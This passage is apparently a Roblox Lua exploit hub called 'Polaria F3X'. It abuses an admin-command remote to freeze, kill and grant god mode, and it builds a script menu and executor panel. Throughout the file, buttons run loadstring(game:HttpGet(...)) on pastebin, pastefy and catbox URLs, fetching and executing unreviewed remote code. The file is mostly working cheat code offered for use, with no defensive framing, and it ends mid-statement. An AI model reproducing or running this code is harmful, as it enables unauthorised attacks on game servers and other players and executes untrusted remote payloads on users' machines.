--[ Polaria F3X by anonymoos11i11i1 V.7 Last version (I'm quiting this f3x exploits shit bro) ]--


--[ if you deobfuscate and see this message I want to say that scripting is never a easy thing for me I try to learn Lua learn to understand stuffs my self I can make a gui I can make a SYNCAPI script but it's all over nothing is left I tried several several times but the winner get to write history and not the loser this community is full of doxing and cyber crimes I can't believe this collapsing kids game can have this dark truth ai is a tool that created hundreds of skids on scriptblox and now people can't even identify what's ai and what's not I am very disappointed you act tuff while you can't do shit ]--


--[ Make sure your device is not a potato to run the maps properly ]--

--[ Printing (Very useless)]--
staffupAnim.AnimationId = "rbxassetid://27432691"

local swordhitAnim = Instance.new("Animation")
swordhitAnim.AnimationId = "rbxassetid://27432686"

local holdstaffAnim = Instance.new("Animation")
holdstaffAnim.AnimationId = "rbxassetid://57794492"

local stabAnim = Instance.new("Animation")
stabAnim.AnimationId = "rbxassetid://30174375"


				local track1 = humanoid:LoadAnimation(staffupAnim)
				local track2 = humanoid:LoadAnimation(swordhitAnim)
				holdTrack = humanoid:LoadAnimation(holdstaffAnim)




function GrabAnim()
				track1.Looped = false
				track2.Looped = false
				holdTrack.Looped = false

				track1:Play()
				track1.Stopped:Wait()

				track2:Play()
				track2.Stopped:Wait()

				holdTrack:Play()
				holdTrack:AdjustSpeed(0)
end

function Kill()
local stabTrack = humanoid:LoadAnimation(stabAnim)
	stabTrack.Looped = false
	stabTrack:Play()
	stabTrack.Stopped:Wait()

	if holdTrack then holdTrack:Stop() end
end


function failed()
				track1.Looped = false
				track2.Looped = false
				holdTrack.Looped = false

				track1:Play()
        track1:AdjustSpeed(3)
				track1.Stopped:Wait()

				
         holdTrack:Play()
         wait(0.3)
         holdTrack:Stop()
end


local isBusy = false
local alignPosition
local alignOrientation

local Players = game:GetService("Players")
local player = Players.LocalPlayer 

local function attachBehind(targetChar)
    local root = character:FindFirstChild("HumanoidRootPart")
    local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
    if root and targetRoot then
        
        local attachment0 = root:FindFirstChild("Attachment") or Instance.new("Attachment", root)
        local attachment1 = targetRoot:FindFirstChild("Attachment") or Instance.new("Attachment", targetRoot)

   
        alignPosition = Instance.new("AlignPosition")
        alignPosition.MaxForce = 1000000
        alignPosition.Responsiveness = 200
        alignPosition.Attachment0 = attachment0
        alignPosition.Attachment1 = attachment1
        alignPosition.Parent = root
        alignOrientation = Instance.new("AlignOrientation")
        alignOrientation.MaxTorque = 1000000
        alignOrientation.Responsiveness = 200
        alignOrientation.Attachment0 = attachment0
        alignOrientation.Attachment1 = attachment1
        alignOrientation.Parent = root

     
        attachment1.Position = Vector3.new(0, 0, 0.5)
    end
end

local function detach()
    if alignPosition then
        alignPosition:Destroy()
        alignPosition = nil
    end
    if alignOrientation then
        alignOrientation:Destroy()
        alignOrientation = nil
    end
end

local function attacke()
    if isBusy then return end
    isBusy = true

    local hitPlayer = nil
local touchedConnection

local function onTouch(other)
    local otherPlayer = Players:GetPlayerFromCharacter(other.Parent)
    if otherPlayer and otherPlayer ~= player then
        hitPlayer = otherPlayer
    end
end

touchedConnection = arm.Touched:Connect(onTouch)
task.wait(0.15)
if touchedConnection then
    touchedConnection:Disconnect()
end

    if hitPlayer and hitPlayer.Character then
        
RequestCommand:InvokeServer(";speed " ..hitPlayer.Name.. " 0")
 
        
				track1.Looped = false
				track2.Looped = false
				holdTrack.Looped = false

				track1:Play()
				track1.Stopped:Wait()

				track2:Play()
        track2:AdjustSpeed(3)
				track2.Stopped:Wait()

				holdTrack:Play()
        
				holdTrack:AdjustSpeed(0)
spawn(function()
attachBehind(hitPlayer.Character)
wait(0.8)
detach()
end)
spawn(function()
SetLocked(hitPlayer.Character.Torso, false)
end)
spawn(function()
SetLocked(char.Torso, false)
end)
 Weld(character.Torso,hitPlayer.Character.Torso,character.Torso)
Weld(character.Torso,hitPlayer.Character.HumanoidRootPart,character.Torso)
Weld(character.Torso,hitPlayer.Character.Head,character.Torso)


wait(3)
            spawn(function()
            Kill()
            end)
            bleed(hitPlayer)
            wait(0.5)
           RequestCommand:InvokeServer(";kill " ..hitPlayer.Name)
           wait(0.5)
breakWelds(character.Torso)
breakWelds(hitPlayer.Character.Torso)
spawn(function()
wait(0.8)

spawn(function()
SetLocked(hitPlayer.Character.Torso, false)
end)
spawn(function()
SetLocked(hitPlayer.Character["Right Arm"], false)
end)
spawn(function()
SetLocked(hitPlayer.Character["Left Arm"], false)
end)
spawn(function()
SetLocked(hitPlayer.Character["Right Leg"], false)
end)
spawn(function()
SetLocked(hitPlayer.Character["Left Leg"], false)
end)

spawn(function()
SetCollision(hitPlayer.Character.Torso, true)
end)
spawn(function()
SetCollision(hitPlayer.Character["Right Arm"], true)
end)
spawn(function()
SetCollision(hitPlayer.Character["Left Arm"], true)
end)
spawn(function()
SetCollision(hitPlayer.Character["Right Leg"], true)
end)
spawn(function()
SetCollision(hitPlayer.Character["Left Leg"], true)
end)
end)

wait(0.3)
           
            
            isBusy = false
  

    else
        
        failed()
        wait(0.4)
            isBusy = false
    end
end




UserInputService.InputBegan:Connect(function(input, gameProcessed)
 if gameProcessed then return end

 if input.KeyCode == Enum.KeyCode.Z then
  local args = {
  "Remove",
  {
   knfe.Handle
  }
 }
 _(args)
 knfe:Destroy()

 RequestCommand:InvokeServer(";hat me 18420472059")
 wait(1)
 local knife = character:FindFirstChild("Accessory (KNIF4ELERFTAccessory)")

 spawn(function()
 local args = {
  "Remove",
  {
   knife.Handle.SpecialMesh
  }
 }
 _(args)
 end)

 spawn(function()
 AddMesh(knife.Handle)
 end)
 spawn(function()
 SetMesh(knife.Handle, "18114736783", Vector3.new(0, 0,-0.25))
 end)
 spawn(function()
 SetTexture(knife.Handle, "80617091791234")
 end)

 ready = true
 end 
end)




UserInputService.TouchTap:Connect(function(input, gameProcessed)
    if gameProcessed then return end
if ready == true then
    attacke()
end
end)

end
end)

uzi.Name = "uzi"
uzi.Parent = scriptspage
uzi.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
uzi.BorderColor3 = Color3.fromRGB(129, 26, 255)
uzi.BorderSizePixel = 2
uzi.Position = UDim2.new(0.512035012, 0, 0.666919887, 0)
uzi.Size = UDim2.new(0, 104, 0, 29)
uzi.Font = Enum.Font.Arial
uzi.Text = "Uzi Gun"
uzi.TextColor3 = Color3.fromRGB(255, 255, 255)
uzi.TextSize = 18.000
uzi.TextWrapped = true
uzi.MouseButton1Click:Connect(function()
rq:InvokeServer(";shirt me 1313573671")
rq:InvokeServer(";pants me 6458756358")
loadstring(game:HttpGet("https://files.catbox.moe/o5iwhr.txt"))()
end)

guns.Name = "guns"
guns.Parent = scriptspage
guns.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
guns.BorderColor3 = Color3.fromRGB(129, 26, 255)
guns.BorderSizePixel = 2
guns.Position = UDim2.new(0.752735257, 0, 0.666919887, 0)
guns.Size = UDim2.new(0, 99, 0, 29)
guns.Font = Enum.Font.Arial
guns.Text = "Thomas"
guns.TextColor3 = Color3.fromRGB(255, 255, 255)
guns.TextSize = 18.000
guns.TextWrapped = true
guns.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastebin.com/raw/jDpU45cz"))()
end)

stra.Name = "stra"
stra.Parent = scriptspage
stra.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
stra.BorderColor3 = Color3.fromRGB(129, 26, 255)
stra.BorderSizePixel = 2
stra.Position = UDim2.new(0.0306345727, 0, 0.791033387, 0)
stra.Size = UDim2.new(0, 104, 0, 29)
stra.Font = Enum.Font.Arial
stra.Text = "Shedletskify"
stra.TextColor3 = Color3.fromRGB(255, 255, 255)
stra.TextSize = 18.000
stra.TextWrapped = true
stra.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/UQ8B34oY/raw"))()
end)

k0p.Name = "k0p"
k0p.Parent = scriptspage
k0p.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
k0p.BorderColor3 = Color3.fromRGB(129, 26, 255)
k0p.BorderSizePixel = 2
k0p.Position = UDim2.new(0.271334797, 0, 0.791033387, 0)
k0p.Size = UDim2.new(0, 104, 0, 29)
k0p.Font = Enum.Font.Arial
k0p.Text = "K**P V11"
k0p.TextColor3 = Color3.fromRGB(255, 255, 255)
k0p.TextSize = 18.000
k0p.TextWrapped = true
k0p.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://files.catbox.moe/zj8l0y.txt"))()
end)

infiniteyield.Name = "infinite yield"
infiniteyield.Parent = scriptspage
infiniteyield.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
infiniteyield.BorderColor3 = Color3.fromRGB(129, 26, 255)
infiniteyield.BorderSizePixel = 2
infiniteyield.Position = UDim2.new(0.512035012, 0, 0.791033387, 0)
infiniteyield.Size = UDim2.new(0, 104, 0, 29)
infiniteyield.Font = Enum.Font.Arial
infiniteyield.Text = "INF YIELD"
infiniteyield.TextColor3 = Color3.fromRGB(255, 255, 255)
infiniteyield.TextSize = 18.000
infiniteyield.TextWrapped = true

exser.Name = "exser"
exser.Parent = scriptspage
exser.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
exser.BorderColor3 = Color3.fromRGB(129, 26, 255)
exser.BorderSizePixel = 2
exser.Position = UDim2.new(0.752735257, 0, 0.791033387, 0)
exser.Size = UDim2.new(0, 99, 0, 29)
exser.Font = Enum.Font.Arial
exser.Text = "ExSer"
exser.TextColor3 = Color3.fromRGB(255, 255, 255)
exser.TextSize = 18.000
exser.TextWrapped = true
exser.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/7sO8ckTL/raw"))()
end)

nextpage.Name = "nextpage"
nextpage.Parent = scriptspage
nextpage.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
nextpage.BorderColor3 = Color3.fromRGB(129, 26, 255)
nextpage.BorderSizePixel = 2
nextpage.Position = UDim2.new(0.463894963, 0, 0.922239065, 0)
nextpage.Size = UDim2.new(0, 34, 0, 15)
nextpage.Font = Enum.Font.Arial
nextpage.Text = ">"
nextpage.TextColor3 = Color3.fromRGB(255, 255, 255)
nextpage.TextSize = 18.000
nextpage.TextWrapped = true

Executor.Name = "Executor"
Executor.Parent = Holder
Executor.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Executor.BorderColor3 = Color3.fromRGB(129, 26, 255)
Executor.BorderSizePixel = 2
Executor.Position = UDim2.new(0.654266953, 0, 0, 0)
Executor.Size = UDim2.new(0, 79, 0, 29)
Executor.Font = Enum.Font.Arial
Executor.Text = "Executor"
Executor.TextColor3 = Color3.fromRGB(255, 255, 255)
Executor.TextSize = 18.000
Executor.TextWrapped = true

executorpage.Name = "executorpage"
executorpage.Parent = Holder
executorpage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
executorpage.BackgroundTransparency = 1.000
executorpage.BorderColor3 = Color3.fromRGB(0, 0, 0)
executorpage.BorderSizePixel = 0
executorpage.Position = UDim2.new(0, 0, 0.093247585, 0)
executorpage.Size = UDim2.new(0, 457, 0, 282)
executorpage.Visible = false

input.Name = "input"
input.Parent = executorpage
input.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
input.BorderColor3 = Color3.fromRGB(129, 26, 255)
input.BorderSizePixel = 2
input.Position = UDim2.new(0.0153172864, 0, 0.0319148935, 0)
input.Size = UDim2.new(0, 444, 0, 218)
input.ClearTextOnFocus = false
input.Font = Enum.Font.Code
input.MultiLine = true
input.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
input.PlaceholderText = "--[\n         Made by Alif\n--["
input.Text = ""
input.TextColor3 = Color3.fromRGB(17, 255, 0)
input.TextSize = 14.000
input.TextXAlignment = Enum.TextXAlignment.Left
input.TextYAlignment = Enum.TextYAlignment.Top

exec.Name = "exec"
exec.Parent = executorpage
exec.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
exec.BorderColor3 = Color3.fromRGB(129, 26, 255)
exec.BorderSizePixel = 2
exec.Position = UDim2.new(0.0153172864, 0, 0.847770989, 0)
exec.Size = UDim2.new(0, 104, 0, 33)
exec.Font = Enum.Font.Arial
exec.Text = "Execute"
exec.TextColor3 = Color3.fromRGB(255, 255, 255)
exec.TextSize = 18.000
exec.TextWrapped = true

clear.Name = "clear"
clear.Parent = executorpage
clear.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
clear.BorderColor3 = Color3.fromRGB(129, 26, 255)
clear.BorderSizePixel = 2
clear.Position = UDim2.new(0.260393888, 0, 0.847770989, 0)
clear.Size = UDim2.new(0, 104, 0, 33)
clear.Font = Enum.Font.Arial
clear.Text = "Clear"
clear.TextColor3 = Color3.fromRGB(255, 255, 255)
clear.TextSize = 18.000
clear.TextWrapped = true

hey.Name = "hey"
hey.Parent = executorpage
hey.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
hey.BackgroundTransparency = 1.000
hey.BorderColor3 = Color3.fromRGB(0, 0, 0)
hey.BorderSizePixel = 0
hey.Position = UDim2.new(0.51859957, 0, 0.847770989, 0)
hey.Size = UDim2.new(0, 100, 0, 32)
hey.Font = Enum.Font.Arial
hey.Text = "Execute on :"
hey.TextColor3 = Color3.fromRGB(255, 255, 255)
hey.TextSize = 18.000
hey.TextXAlignment = Enum.TextXAlignment.Left

idk.Name = "idk"
idk.Parent = executorpage
idk.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
idk.BackgroundTransparency = 1.000
idk.BorderColor3 = Color3.fromRGB(0, 0, 0)
idk.BorderSizePixel = 0
idk.Position = UDim2.new(0.737417936, 0, 0.847770989, 0)
idk.Size = UDim2.new(0, 100, 0, 32)
idk.Font = Enum.Font.Arial
idk.Text = "Sever"
idk.TextColor3 = Color3.fromRGB(98, 255, 0)
idk.TextSize = 18.000
idk.TextXAlignment = Enum.TextXAlignment.Left

Output.Name = "Output"
Output.Parent = Holder
Output.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Output.BorderColor3 = Color3.fromRGB(129, 26, 255)
Output.BorderSizePixel = 2
Output.Position = UDim2.new(0.827133477, 0, 0, 0)
Output.Size = UDim2.new(0, 79, 0, 29)
Output.Font = Enum.Font.Arial
Output.Text = "Output"
Output.TextColor3 = Color3.fromRGB(255, 255, 255)
Output.TextSize = 18.000
Output.TextWrapped = true

outputpage.Name = "outputpage"
outputpage.Parent = Holder
outputpage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
outputpage.BackgroundTransparency = 1.000
outputpage.BorderColor3 = Color3.fromRGB(129, 26, 255)
outputpage.BorderSizePixel = 2
outputpage.Position = UDim2.new(0, 0, 0.093247585, 0)
outputpage.Size = UDim2.new(0, 457, 0, 282)
outputpage.Visible = false

MainComponent.Name = "MainComponent"
MainComponent.Parent = outputpage
MainComponent.Active = true
MainComponent.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MainComponent.BorderColor3 = Color3.fromRGB(129, 26, 255)
MainComponent.BorderSizePixel = 2
MainComponent.Position = UDim2.new(0.0218818374, 0, 0.0177304968, 0)
MainComponent.Size = UDim2.new(0, 439, 0, 220)
MainComponent.CanvasSize = UDim2.new(0, 0, 8, 0)

output.Name = "output"
output.Parent = MainComponent
output.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
output.BorderColor3 = Color3.fromRGB(0, 0, 0)
output.BorderSizePixel = 0
output.Size = UDim2.new(0, 439, 0, 9999999)
output.ClearTextOnFocus = false
output.Font = Enum.Font.Code
output.MultiLine = true
output.Text = "\n"
output.TextColor3 = Color3.fromRGB(255, 255, 255)
output.TextSize = 16.000
output.TextWrapped = true
output.TextXAlignment = Enum.TextXAlignment.Left
output.TextYAlignment = Enum.TextYAlignment.Top

clear_2.Name = "clear"
clear_2.Parent = outputpage
clear_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
clear_2.BorderColor3 = Color3.fromRGB(129, 26, 255)
clear_2.BorderSizePixel = 2
clear_2.Position = UDim2.new(0.256017506, 0, 0.851063848, 0)
clear_2.Size = UDim2.new(0, 219, 0, 29)
clear_2.Font = Enum.Font.Arial
clear_2.Text = "Clear"
clear_2.TextColor3 = Color3.fromRGB(255, 255, 255)
clear_2.TextSize = 18.000
clear_2.TextWrapped = true

homepage.Name = "homepage"
homepage.Parent = Holder
homepage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
homepage.BackgroundTransparency = 1.000
homepage.BorderColor3 = Color3.fromRGB(0, 0, 0)
homepage.BorderSizePixel = 0
homepage.Position = UDim2.new(0, 0, 0.0996784568, 0)
homepage.Size = UDim2.new(0, 457, 0, 280)

br.Name = "br"
br.Parent = homepage
br.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
br.BackgroundTransparency = 1.000
br.BorderColor3 = Color3.fromRGB(0, 0, 0)
br.BorderSizePixel = 0
br.Position = UDim2.new(0.249452949, 0, 0.0500000007, 0)
br.Size = UDim2.new(0, 96, 0, 29)
br.Font = Enum.Font.Arial
br.Text = "Username :"
br.TextColor3 = Color3.fromRGB(255, 255, 255)
br.TextSize = 18.000
br.TextXAlignment = Enum.TextXAlignment.Left

user.Name = "user"
user.Parent = homepage
user.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
user.BackgroundTransparency = 1.000
user.BorderColor3 = Color3.fromRGB(0, 0, 0)
user.BorderSizePixel = 0
user.Position = UDim2.new(0.459518611, 0, 0.0500000007, 0)
user.Size = UDim2.new(0, 96, 0, 29)
user.Font = Enum.Font.Arial
user.Text = "Verifying..."
user.TextColor3 = Color3.fromRGB(255, 255, 255)
user.TextSize = 18.000
user.TextXAlignment = Enum.TextXAlignment.Left

br2.Name = "br2"
br2.Parent = homepage
br2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
br2.BackgroundTransparency = 1.000
br2.BorderColor3 = Color3.fromRGB(0, 0, 0)
br2.BorderSizePixel = 0
br2.Position = UDim2.new(0.249452949, 0, 0.153571427, 0)
br2.Size = UDim2.new(0, 96, 0, 29)
br2.Font = Enum.Font.Arial
br2.Text = "Age Days :"
br2.TextColor3 = Color3.fromRGB(255, 255, 255)
br2.TextSize = 18.000
br2.TextXAlignment = Enum.TextXAlignment.Left

age.Name = "age"
age.Parent = homepage
age.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
age.BackgroundTransparency = 1.000
age.BorderColor3 = Color3.fromRGB(0, 0, 0)
age.BorderSizePixel = 0
age.Position = UDim2.new(0.459518611, 0, 0.153571427, 0)
age.Size = UDim2.new(0, 96, 0, 29)
age.Font = Enum.Font.Arial
age.Text = "Verifying..."
age.TextColor3 = Color3.fromRGB(255, 255, 255)
age.TextSize = 18.000
age.TextXAlignment = Enum.TextXAlignment.Left

br3.Name = "br3"
br3.Parent = homepage
br3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
br3.BackgroundTransparency = 1.000
br3.BorderColor3 = Color3.fromRGB(0, 0, 0)
br3.BorderSizePixel = 0
br3.Position = UDim2.new(0.249452949, 0, 0.257142872, 0)
br3.Size = UDim2.new(0, 96, 0, 29)
br3.Font = Enum.Font.Arial
br3.Text = "FE :"
br3.TextColor3 = Color3.fromRGB(255, 255, 255)
br3.TextSize = 18.000
br3.TextXAlignment = Enum.TextXAlignment.Left

f.Name = "f"
f.Parent = homepage
f.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
f.BackgroundTransparency = 1.000
f.BorderColor3 = Color3.fromRGB(0, 0, 0)
f.BorderSizePixel = 0
f.Position = UDim2.new(0.334792137, 0, 0.257142872, 0)
f.Size = UDim2.new(0, 96, 0, 29)
f.Font = Enum.Font.Arial
f.Text = "Enabled!"
f.TextColor3 = Color3.fromRGB(255, 255, 255)
f.TextSize = 18.000
f.TextXAlignment = Enum.TextXAlignment.Left

user_2.Name = "user"
user_2.Parent = homepage
user_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
user_2.BackgroundTransparency = 1.000
user_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
user_2.BorderSizePixel = 0
user_2.Position = UDim2.new(0.0153172864, 0, 0.0714285746, 0)
user_2.Size = UDim2.new(0, 100, 0, 100)
user_2.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"

svrtime.Name = "svrtime"
svrtime.Parent = homepage
svrtime.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
svrtime.BackgroundTransparency = 1.000
svrtime.BorderColor3 = Color3.fromRGB(0, 0, 0)
svrtime.BorderSizePixel = 0
svrtime.Position = UDim2.new(0.0153172864, 0, 0.460714281, 0)
svrtime.Size = UDim2.new(0, 96, 0, 29)
svrtime.Font = Enum.Font.Arial
svrtime.Text = "Server Time: Verifying..."
svrtime.TextColor3 = Color3.fromRGB(255, 255, 255)
svrtime.TextSize = 18.000
svrtime.TextXAlignment = Enum.TextXAlignment.Left

realtime.Name = "realtime"
realtime.Parent = homepage
realtime.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
realtime.BackgroundTransparency = 1.000
realtime.BorderColor3 = Color3.fromRGB(0, 0, 0)
realtime.BorderSizePixel = 0
realtime.Position = UDim2.new(0.0153172864, 0, 0.564285696, 0)
realtime.Size = UDim2.new(0, 96, 0, 29)
realtime.Font = Enum.Font.Arial
realtime.Text = "Time: Verifying..."
realtime.TextColor3 = Color3.fromRGB(255, 255, 255)
realtime.TextSize = 18.000
realtime.TextXAlignment = Enum.TextXAlignment.Left

jobid.Name = "jobid"
jobid.Parent = homepage
jobid.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
jobid.BackgroundTransparency = 1.000
jobid.BorderColor3 = Color3.fromRGB(0, 0, 0)
jobid.BorderSizePixel = 0
jobid.Position = UDim2.new(0.0153172864, 0, 0.66785717, 0)
jobid.Size = UDim2.new(0, 96, 0, 29)
jobid.Font = Enum.Font.Arial
jobid.Text = "Job ID: Verifying..."
jobid.TextColor3 = Color3.fromRGB(255, 255, 255)
jobid.TextSize = 18.000
jobid.TextXAlignment = Enum.TextXAlignment.Left

placeid.Name = "placeid"
placeid.Parent = homepage
placeid.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
placeid.BackgroundTransparency = 1.000
placeid.BorderColor3 = Color3.fromRGB(0, 0, 0)
placeid.BorderSizePixel = 0
placeid.Position = UDim2.new(0.0153172864, 0, 0.771428585, 0)
placeid.Size = UDim2.new(0, 96, 0, 29)
placeid.Font = Enum.Font.Arial
placeid.Text = "Place ID: Verifying..."
placeid.TextColor3 = Color3.fromRGB(255, 255, 255)
placeid.TextSize = 18.000
placeid.TextXAlignment = Enum.TextXAlignment.Left
local MarketplaceService = game:GetService("MarketplaceService")

local placeId = game.PlaceId
local gameName = "Game Name Not Found"

pcall(function()
	local info = MarketplaceService:GetProductInfo(placeId)
	gameName = info.Name
end)

placeid.Text = "Place ID: " .. placeId .. " (" .. gameName .. ")"


idk_2.Name = "idk"
idk_2.Parent = homepage
idk_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
idk_2.BackgroundTransparency = 1.000
idk_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
idk_2.BorderSizePixel = 0
idk_2.Position = UDim2.new(0.0153172864, 0, 0.875, 0)
idk_2.Size = UDim2.new(0, 96, 0, 29)
idk_2.Font = Enum.Font.Arial
idk_2.Text = "Country: us"
idk_2.TextColor3 = Color3.fromRGB(255, 255, 255)
idk_2.TextSize = 18.000
idk_2.TextXAlignment = Enum.TextXAlignment.Left

progress.Name = "progress"
progress.Parent = homepage
progress.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
progress.BackgroundTransparency = 1.000
progress.BorderColor3 = Color3.fromRGB(0, 0, 0)
progress.BorderSizePixel = 0
progress.Position = UDim2.new(0.251148582, 0, 0.344999909, 0)
progress.Size = UDim2.new(0, 334, 0, 31)
progress.Font = Enum.Font.Arial
progress.Text = "Success! You are now be able to use."
progress.TextColor3 = Color3.fromRGB(255, 255, 255)
progress.TextSize = 18.000
progress.TextWrapped = true
progress.TextXAlignment = Enum.TextXAlignment.Left

scriptspage3.Name = "scriptspage3"
scriptspage3.Parent = Holder
scriptspage3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
scriptspage3.BackgroundTransparency = 1.000
scriptspage3.BorderColor3 = Color3.fromRGB(0, 0, 0)
scriptspage3.BorderSizePixel = 0
scriptspage3.Position = UDim2.new(0, 0, 0.093247585, 0)
scriptspage3.Size = UDim2.new(0, 457, 0, 282)
scriptspage3.Visible = false

nextpage_2.Name = "nextpage"
nextpage_2.Parent = scriptspage3
nextpage_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
nextpage_2.BorderColor3 = Color3.fromRGB(129, 26, 255)
nextpage_2.BorderSizePixel = 2
nextpage_2.Position = UDim2.new(0.463894963, 0, 0.922239065, 0)
nextpage_2.Size = UDim2.new(0, 34, 0, 15)
nextpage_2.Font = Enum.Font.Arial
nextpage_2.Text = "<"
nextpage_2.TextColor3 = Color3.fromRGB(255, 255, 255)
nextpage_2.TextSize = 18.000
nextpage_2.TextWrapped = true

scriptspage2.Name = "scriptspage2"
scriptspage2.Parent = Holder
scriptspage2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
scriptspage2.BackgroundTransparency = 1.000
scriptspage2.BorderColor3 = Color3.fromRGB(0, 0, 0)
scriptspage2.BorderSizePixel = 0
scriptspage2.Position = UDim2.new(0, 0, 0.0996784568, 0)
scriptspage2.Size = UDim2.new(0, 457, 0, 280)
scriptspage2.Visible = false

omni.Name = "omni"
omni.Parent = scriptspage2
omni.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
omni.BorderColor3 = Color3.fromRGB(129, 26, 255)
omni.BorderSizePixel = 2
omni.Position = UDim2.new(0.0306345727, 0, 0.0357142873, 0)
omni.Size = UDim2.new(0, 104, 0, 29)
omni.Font = Enum.Font.Arial
omni.Text = "God"
omni.TextColor3 = Color3.fromRGB(255, 255, 255)
omni.TextScaled = true
omni.TextSize = 18.000
omni.TextWrapped = true
omni.MouseButton1Click:Connect(function()
rq:InvokeServer(";god")
end)

destructiong.Name = "destruction g"
destructiong.Parent = scriptspage2
destructiong.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
destructiong.BorderColor3 = Color3.fromRGB(129, 26, 255)
destructiong.BorderSizePixel = 2
destructiong.Position = UDim2.new(0.271334797, 0, 0.0357142873, 0)
destructiong.Size = UDim2.new(0, 104, 0, 29)
destructiong.Font = Enum.Font.Arial
destructiong.Text = "Destruction"
destructiong.TextColor3 = Color3.fromRGB(255, 255, 255)
destructiong.TextScaled = true
destructiong.TextSize = 18.000
destructiong.TextWrapped = true
destructiong.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/psSFNsX2/raw"))()
end)

IDE.Name = "IDE"
IDE.Parent = scriptspage2
IDE.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
IDE.BorderColor3 = Color3.fromRGB(129, 26, 255)
IDE.BorderSizePixel = 2
IDE.Position = UDim2.new(0.752735257, 0, 0.793692887, 0)
IDE.Size = UDim2.new(0, 99, 0, 29)
IDE.Font = Enum.Font.Arial
IDE.Text = "Dominant Executor"
IDE.TextColor3 = Color3.fromRGB(255, 255, 255)
IDE.TextScaled = true
IDE.TextSize = 18.000
IDE.TextWrapped = true
IDE.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastebin.com/raw/6nzH6Nx0"))()
end)

mystic.Name = "mystic"
mystic.Parent = scriptspage2
mystic.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
mystic.BorderColor3 = Color3.fromRGB(129, 26, 255)
mystic.BorderSizePixel = 2
mystic.Position = UDim2.new(0.512035012, 0, 0.0357142873, 0)
